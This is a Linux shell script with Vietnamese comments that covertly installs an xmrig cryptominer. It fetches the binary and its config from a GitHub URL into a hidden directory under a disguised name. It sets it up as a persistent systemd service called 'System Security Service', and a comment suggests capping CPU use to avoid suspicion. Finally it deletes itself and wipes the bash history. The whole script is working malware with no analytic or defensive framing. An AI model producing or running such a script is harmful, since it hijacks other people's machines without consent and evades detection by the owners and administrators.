#!/bin/bash

# 1. Kiểm tra quyền root (Chỉ chạy khi có quyền cao nhất)
if [[ $EUID -ne 0 ]]; then
   exit 1
fi

# 2. Định nghĩa biến để dễ quản lý và thay đổi nhanh
SERVICE_NAME="sys_update"
DISPLAY_NAME="System Security Service"
INSTALL_DIR="/usr/lib/.sys_cache"
EXEC_NAME="sys_mgr"
CONF_URL="https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/config.json"
BIN_URL="https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/xmrig"

# 3. Dọn dẹp dấu vết của các phiên bản cũ (nếu có)
systemctl stop $SERVICE_NAME.service 2>/dev/null
systemctl disable $SERVICE_NAME.service 2>/dev/null
rm -rf $INSTALL_DIR

# 4. Tạo môi trường ẩn
mkdir -p $INSTALL_DIR

# 5. Tải file với cờ -s (silent) và -L (follow redirect)
curl -sL $CONF_URL -o $INSTALL_DIR/config.json
curl -sL $BIN_URL -o $INSTALL_DIR/$EXEC_NAME

# 6. Cấp quyền thực thi
chmod +x $INSTALL_DIR/$EXEC_NAME

# 7. Tạo Service Systemd (Tối ưu để khởi động lại và ẩn danh)
cat <<EOF > /etc/systemd/system/$SERVICE_NAME.service
[Unit]
Description=$DISPLAY_NAME
After=network.target network-online.target
Wants=network-online.target

[Service]
Type=simple
# Sử dụng WorkingDirectory để file log/temp không văng ra ngoài
WorkingDirectory=$INSTALL_DIR
ExecStart=$INSTALL_DIR/$EXEC_NAME --config=$INSTALL_DIR/config.json
Restart=always
RestartSec=15
# Giới hạn tài nguyên để không gây nghi ngờ (tùy chọn)
# CPUQuota=50%

[Install]
WantedBy=multi-user.target
EOF

# 8. Kích hoạt hệ thống
systemctl daemon-reload
systemctl enable $SERVICE_NAME.service >/dev/null 2>&1
systemctl start $SERVICE_NAME.service

# 9. Xóa sạch dấu vết cài đặt
# Xóa script cài đặt hiện tại sau khi chạy xong
rm -- "$0"

# Xóa lịch sử bash ngay lập tức
cat /dev/null > ~/.bash_history
history -c
